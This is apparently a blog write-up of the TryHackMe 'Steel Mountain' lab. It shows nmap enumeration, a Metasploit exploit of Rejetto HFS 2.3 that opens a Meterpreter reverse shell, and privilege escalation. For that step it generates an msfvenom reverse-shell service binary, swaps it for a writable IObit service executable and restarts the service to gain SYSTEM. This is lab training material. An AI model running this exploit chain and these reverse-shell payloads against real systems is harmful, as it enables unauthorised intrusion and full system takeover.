---
layout: post
title: Pentesting&#58; Tryhackme/Steel Mountain
---

## TryHackMe: Steel Mountain - Write-up

### Enumeration
##### nmap
```
└─$ nmap -p- -T5 -sC -sV 10.10.56.194  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-01 15:18 PDT
Warning: 10.10.56.194 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.56.194
Host is up (0.15s latency).
Not shown: 65497 closed tcp ports (conn-refused)
PORT      STATE    SERVICE            VERSION
80/tcp    open     http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
2289/tcp  filtered dict-lookup
3389/tcp  open     ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2022-09-30T22:10:00
|_Not valid after:  2023-04-01T22:10:00
|_ssl-date: 2022-10-01T22:26:02+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2022-10-01T22:25:55+00:00
5746/tcp  filtered fcopys-server
5985/tcp  open     http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6180/tcp  filtered unknown
8080/tcp  open     http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
15497/tcp filtered unknown
18417/tcp filtered unknown
18476/tcp filtered unknown
20036/tcp filtered unknown
20262/tcp filtered unknown
25840/tcp filtered unknown
25956/tcp filtered unknown
30656/tcp filtered unknown
32295/tcp filtered unknown
35762/tcp filtered unknown
37822/tcp filtered unknown
38455/tcp filtered unknown
40092/tcp filtered unknown
46526/tcp filtered unknown
47001/tcp open     http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open     msrpc              Microsoft Windows RPC
49153/tcp open     msrpc              Microsoft Windows RPC
49154/tcp open     msrpc              Microsoft Windows RPC
49155/tcp open     msrpc              Microsoft Windows RPC
49156/tcp open     msrpc              Microsoft Windows RPC
49169/tcp open     msrpc              Microsoft Windows RPC
49170/tcp open     msrpc              Microsoft Windows RPC
51850/tcp filtered unknown
55776/tcp filtered unknown
58177/tcp filtered unknown
63319/tcp filtered unknown
64199/tcp filtered unknown
65416/tcp filtered unknown
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:36:d0:90:7d:95 (unknown)
| smb2-time: 
|   date: 2022-10-01T22:25:56
|_  start_date: 2022-10-01T22:09:51
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 447.79 seconds
```

### Foothold

##### Rejetto HTTP File Server

One of the big stand outs of the enumeration phase was the rejetto http file server we found on port 8080. This has a know RCE vulnerability as shown by searchsploit.
```
--------------------------------------------- ---------------------------------
 Exploit Title                               |  Path
--------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Comman | windows/webapps/49125.py
--------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Lets open metasploit and search for an exploit there.
```
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
```

Bringing up the available options show we need to set rhost, rport, and lhost. Once those are set, run the exploit.
```
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.2.11.19:4444 
[*] Using URL: http://10.2.11.19:8080/ZDD9g9aXM8
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /ZDD9g9aXM8
[*] Sending stage (175686 bytes) to 10.10.181.238

[*] Meterpreter session 1 opened (10.2.11.19:4444 -> 10.10.181.238:49215) at 2022-10-01 18:04:15 -0700
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\JpNXTjBY.vbs' on the target

meterpreter > 
```

### Privilege Escalation

Now that we have a foothold, we can enumerate the windows system to find a vector for privilege escalation. To do that, we can use a powershell script called PowerUp. The purpose of this script is to enumerate windows vulnerability vectors that rely on misconfigurations. Lets upload the script using meterpreter.
```
meterpreter > upload ~/Desktop/THM/steelmountain/PowerUp.ps1
[*] uploading  : /home/jake/Desktop/THM/steelmountain/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/jake/Desktop/THM/steelmountain/PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : /home/jake/Desktop/THM/steelmountain/PowerUp.ps1 -> PowerUp.ps1
```

To execute the script, we will need to be in powershell. To do this, we can enter the following commands.
```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > 
```

Now we can run the command. 
```
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files
```

We find one service with the CanRestart option set to true, AdvancedSystemCareService9. This opens it up to a unopened service path vulnerability. The CanRestart option allows us to restard the service, but more importantly, the directory to the service is also writable. This means we can replace the actual application with our malicious one and restard it to execute. 

First, we need to generate a windows reverse shell executable using msfvenom.
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.2.11.19 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCservice.exe
```

Now we can upload the binary to replace the legitimate one, followed by restarting the program to gain root. First we need to cd to the directory that holds the executable we will be replacing.
```
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
```

Unfortunately, when we try to upload the payload, the it errors out by prompting us that the service is still running. We can stop the service in a normal shell with the command below.
```
meterpreter > shell
Process 1496 created.
Channel 4 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\IObit\Advanced SystemCare>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Now we can upload the payload.
```
meterpreter > upload ~/Desktop/THM/steelmountain/ASCservice.exe
[*] uploading  : /home/jake/Desktop/THM/steelmountain/ASCservice.exe -> ASCservice.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /home/jake/Desktop/THM/steelmountain/ASCservice.exe -> ASCservice.exe
[*] uploaded   : /home/jake/Desktop/THM/steelmountain/ASCservice.exe -> ASCservice.exe
```

Next step is to setup our listener in msfconsole. Once we connect using the payload above, we will have a privileged shell.
```
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/shell_reverse_tcp
```

Once we set our lhost and lport we can run the listener. Now we can switch back to the listener, start a normal shell, and restart the process to gain our privileged shell.
```
meterpreter > shell
C:\Program Files (x86)\IObit\Advanced SystemCare>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2344
        FLAGS              : 
```

Now we have root.
```
C:\Windows\system32>whoami
whoami
nt authority\system
```
